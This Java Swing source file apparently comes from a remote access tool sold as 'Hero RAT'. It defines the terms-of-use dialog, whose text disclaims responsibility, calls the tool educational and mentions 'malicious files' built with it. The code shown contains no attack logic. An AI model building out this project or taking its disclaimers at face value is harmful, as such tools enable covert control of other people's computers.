package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

import net.herorat.Main;
import net.herorat.utils.Utils;

public class FrameCluf extends JFrame
{
	private static final long serialVersionUID = -5163894445716768805L;
	
	private JScrollPane scroll_terms;
	private JTextArea area_terms;
	
	private JPanel panel_choice;
	private JButton button_accept;
	private JButton button_reject;

	public FrameCluf()
	{
		setTitle("Hero RAT - Terms of use");
		setIconImage(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/icon.png"))).getImage());
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		initComponents();
		this.setMinimumSize(new Dimension(500, 500));
		display();
		centerWindow();
	}
	
	private void initComponents()
	{
		setLayout(new BorderLayout(5, 0));
		createScrollView();
		createPanel();
	}
	
	private void display()
	{
		pack();
		setVisible(true);
	}
	
	private void centerWindow()
	{
		int bounds_top = Toolkit.getDefaultToolkit().getScreenSize().height / 2;
		int bounds_left = Toolkit.getDefaultToolkit().getScreenSize().width / 2;
		int half_height = this.getSize().height / 2;
		int half_width = this.getSize().width / 2;
		this.setLocation(bounds_left - half_width, bounds_top - half_height);
	}
	
	private void createScrollView()
	{
		scroll_terms = new JScrollPane();
		area_terms = new JTextArea();
		area_terms.setColumns(55);
		area_terms.setRows(22);
		area_terms.setLineWrap(true);
		area_terms.setEditable(false);
		scroll_terms.setViewportView(area_terms);
		area_terms.setText("Here at HeroRAT we are not responsible for the nature in which you use our services. The services sold by us are for personal, not distributed, use and should only be used on your own machines or the machines of those who have given you expressed consent for remote management.\n\nRemember that our tools are made for educational purpose, so we do not take any responsiblity for any damage caused by any of or tools or services. Misuse of our tools or services can be very illegal.\nCertain misuse could cause possible jail time or fines, which differ depending on your local laws.\n\nYou, the buyer, agree that you know how to use the desired service. If you do not have basic knowledge of this type of service, please try a free alternative and familiarize yourself.\nWe do not need customers purchasing only to find out that their ports are blocked by their ISP.\n\nBy purchasing, you are stating that you understand and agree to agreements and statements in the Legal section, our Resell agreements and our Refund agreements.\n\nWe are by no means obligated to provide remote control-based support, nor do we have any obligation to respond to your support ticket.\n\nYou are not allowed to share your products, nor are you allowed to share access to your products.\nFailure to comply with these rules may result in an immediate suspension of your license(s), without questions asked.\n\nYou agree that you will NOT distribute malicious files created with any of our services over the internet with the intent of harming/using machines of innocent people.\n\nYou agree that if you do by some sort of means connect to a computer without authorization, by means of accident or other ways, that you will use the uninstall feature to completely remove the connection between the two of you and remove the software from their computer.\n\nFailure to comply with these terms can result in an immediate suspension, the length determined by us, without refund or notice.");
		getContentPane().add(scroll_terms, BorderLayout.CENTER);
	}
	
	private void createPanel()
	{
		panel_choice = new JPanel();
		panel_choice.setPreferredSize(new Dimension(400, 65));
		
		button_accept = new JButton("I accept the terms in the licence agreement");
		button_accept.setPreferredSize(new Dimension(350, 25));
		button_accept.setMnemonic(KeyEvent.VK_A);
		button_accept.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				Main.mainWindow = new MainWindow();
				setVisible(false);
			}
		});
		
		button_reject = new JButton("I do not accept the terms in the licence agreement");
		button_reject.setPreferredSize(new Dimension(350, 25));
		button_reject.setMnemonic(KeyEvent.VK_D);
		button_reject.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				System.exit(1);
			}
		});
		
		panel_choice.add(button_accept, BorderLayout.NORTH);
		panel_choice.add(button_reject, BorderLayout.SOUTH);
		
		getContentPane().add(panel_choice, BorderLayout.SOUTH);
	}
}